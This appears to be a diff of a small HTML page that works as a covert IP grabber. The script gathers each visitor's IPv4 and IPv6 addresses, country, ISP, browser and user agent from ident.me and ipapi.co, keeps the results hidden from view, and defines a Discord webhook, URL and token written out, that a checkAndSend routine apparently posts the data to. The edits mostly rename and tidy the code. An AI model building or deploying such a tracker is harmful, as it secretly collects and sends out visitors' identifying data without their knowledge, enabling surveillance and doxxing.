@@ -1,21 +1,21 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>test</title>
+  <title>Test</title>
   <style>
-    .hidden-info {
+    p {
       display: none;
     }
   </style>
 </head>
 <body>
 
-  <p class="hidden-info">IPv6: <span id="ipv6">Loading...</span></p>
-  <p class="hidden-info">IPv4: <span id="ipv4">Loading...</span></p>
-  <p class="hidden-info">Country: <span id="country">Loading...</span></p>
-  <p class="hidden-info">ISP: <span id="isp">Loading...</span></p>
-  <p class="hidden-info">Browser: <span id="browser-type">Detecting...</span></p>
-  <p class="hidden-info">User Agent: <span id="user-agent">Loading...</span></p>
+  <p>IPv6: <span id="ipv6">Loading...</span></p>
+  <p>IPv4: <span id="ipv4">Loading...</span></p>
+  <p>Country: <span id="country">Loading...</span></p>
+  <p>ISP: <span id="isp">Loading...</span></p>
+  <p>Browser: <span id="browser-type">Detecting...</span></p>
+  <p>User Agent: <span id="user-agent">Loading...</span></p>
 
 <script>
   const webhookUrl = "https://discord.com/api/webhooks/1394009563799490630/EVOCTkNYfTh0qs8CM8o37aNZAGsnoq-AF7yHD-wgh5q8z-VwyQOASBQM5aXqKdE40b7x";
@@ -31,7 +31,6 @@
 
   function getBrowserType() {
     const ua = navigator.userAgent.toLowerCase();
-
     if (/waterfox/.test(ua)) return 'Waterfox';
     if (/edg\//.test(ua)) return 'Microsoft Edge';
     if (/opr\//.test(ua) || window.opr) return 'Opera';
@@ -39,10 +38,8 @@
     if (/brave\//.test(ua)) return 'Brave';
     if (/chrome|chromium|crios/.test(ua)) return 'Google Chrome';
     if (/firefox|fxios/.test(ua)) return 'Mozilla Firefox';
-    if (/samsungbrowser/.test(ua)) return 'Samsung Browser';
-    if (/ucbrowser/.test(ua)) return 'UC Browser';
     if (/safari/.test(ua) && !/chrome|chromium|crios/.test(ua)) return 'Apple Safari';
-    if (/trident|msie/.test(ua)) return 'Microsoft Internet Explorer';
+    if (/trident|msie/.test(ua)) return 'Internet Explorer';
     if (/kaios/.test(ua)) return 'KaiOS Browser';
     if (/seamonkey/.test(ua)) return 'SeaMonkey';
     if (/silk/.test(ua)) return 'Amazon Silk';
@@ -62,17 +59,17 @@
     if (/bingbot/.test(ua)) return 'Bingbot (Crawler)';
     if (/yandexbot/.test(ua)) return 'YandexBot (Crawler)';
     if (/duckduckbot/.test(ua)) return 'DuckDuckBot (Crawler)';
-
     return 'Unknown Browser';
   }
 
   const browserType = getBrowserType();
   const userAgent = navigator.userAgent;
 
+  console.log("User Agent:", userAgent);
   document.getElementById('browser-type').textContent = browserType;
   document.getElementById('user-agent').textContent = userAgent;
 
-  // Fetch IPv6
+  // IPv6
   fetch("https://v6.ident.me/.json")
     .then(res => res.json())
     .then(data => {
@@ -87,7 +84,7 @@
       checkAndSend();
     });
 
-  // Fetch IPv4
+  // IPv4
   fetch("https://v4.ident.me/.json")
     .then(res => res.json())
     .then(data => {
@@ -102,7 +99,7 @@
       checkAndSend();
     });
 
-  // Fetch Geo info
+  // Geo
   fetch("https://ipapi.co/json/")
     .then(res => res.json())
     .then(data => {
